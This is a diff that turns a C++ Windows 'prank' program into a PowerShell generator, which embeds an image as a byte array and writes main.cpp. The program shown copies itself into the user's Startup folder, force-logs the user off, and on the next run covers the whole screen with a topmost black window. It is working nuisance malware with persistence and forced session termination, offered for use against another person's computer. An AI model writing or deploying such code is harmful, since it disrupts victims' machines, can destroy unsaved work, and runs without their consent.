@@ -1,8 +1,16 @@
+$bytes = [System.IO.File]::ReadAllBytes("D:\prank\image.png")
+$hex = $bytes | ForEach-Object { "0x{0:X2}" -f $_ }
+$imageArray = "unsigned char image_data[] = {" + ($hex -join ", ") + "};`nunsigned int image_size = $($bytes.Length);"
+
+$code = @"
 #include <windows.h>
 #include <gdiplus.h>
 #include <shlobj.h>
 #pragma comment(lib, "gdiplus.lib")
+
 using namespace Gdiplus;
+
+$imageArray
 
 ULONG_PTR gdiplusToken;
 Image* pImage = NULL;
@@ -58,8 +66,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     return 0;
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-                   LPSTR lpCmdLine, int nCmdShow) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     char exePath[MAX_PATH];
     GetModuleFileName(NULL, exePath, MAX_PATH);
 
@@ -71,19 +78,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
     strcat_s(startupPath, "\\prank.exe");
 
-    HANDLE hFile = CreateFile(flagPath, GENERIC_READ, 0, NULL,
-                              OPEN_EXISTING, 0, NULL);
+    HANDLE hFile = CreateFile(flagPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+
     if (hFile == INVALID_HANDLE_VALUE) {
         CopyFileA(exePath, startupPath, FALSE);
-        HANDLE hNew = CreateFile(flagPath, GENERIC_WRITE, 0, NULL,
-                                 CREATE_ALWAYS, 0, NULL);
+        HANDLE hNew = CreateFile(flagPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
         CloseHandle(hNew);
-        ExitWindowsEx(EWX_LOGOFF | EWX_FORCE,
-            SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
+        ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
         return 0;
     }
+
     CloseHandle(hFile);
-    DeleteFile(flagPath);
     DeleteFileA(startupPath);
 
     WNDCLASS wc = {};
@@ -95,12 +100,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
+
     HWND hwnd = CreateWindowEx(
         WS_EX_TOPMOST, "BlackScreen", "",
         WS_POPUP | WS_VISIBLE,
         0, 0, sw, sh,
         NULL, NULL, hInstance, NULL
     );
+
     ShowWindow(hwnd, SW_SHOW);
     UpdateWindow(hwnd);
 
@@ -111,6 +118,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     }
     return 0;
 }
+"@
 
+$code | Out-File -Encoding ASCII "D:\prank\main.cpp"
+Write-Host "main.cpp generated!"
 
-// BY RIR OR MELON 
+    
